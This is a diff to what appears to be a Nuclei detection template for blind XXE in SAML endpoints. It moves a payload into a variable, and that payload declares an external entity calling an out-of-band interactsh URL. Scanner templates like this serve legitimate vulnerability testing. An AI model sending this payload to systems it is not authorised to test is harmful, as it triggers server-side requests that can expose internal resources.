@@ -7,6 +7,9 @@ info:
   description: Détecte les vulnérabilités XXE blind dans les endpoints SAML via SAMLResponse
   tags: saml,xxe,blind,ssrf
 
+variables:
+  saml_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE samlp:Response [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>"
+
 http:
   - method: POST
     path:
@@ -37,7 +40,7 @@ http:
       Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 
-    body: "SAMLResponse={{base64_encode('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE samlp:Response [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>')}}"
+    body: "&SAMLResponse={{base64(saml_payload)}}"
 
     matchers:
       - type: word
